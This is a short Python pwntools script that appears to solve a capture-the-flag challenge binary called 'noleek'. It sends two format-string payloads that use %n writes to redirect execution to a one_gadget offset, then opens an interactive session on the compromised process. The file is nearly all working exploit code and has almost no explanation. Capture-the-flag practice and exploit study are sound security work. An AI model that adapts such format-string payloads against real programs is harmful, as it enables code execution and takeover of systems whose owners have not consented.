#!/usr/bin/python3
from pwn import *
from noodlemaker import noodlemaker 

exe = "./noleek"

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main+35
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

one_offset= 0xa5916
p = start()
payload = b"%*1$d%56c%13$n"
paylood = b"%*12d%678166c%41$n"
print(len(paylood))
p.recvuntil(b"leek? ")
p.sendline(payload)
p.recvuntil(b"more leek? ")

p.sendline(paylood)
p.interactive()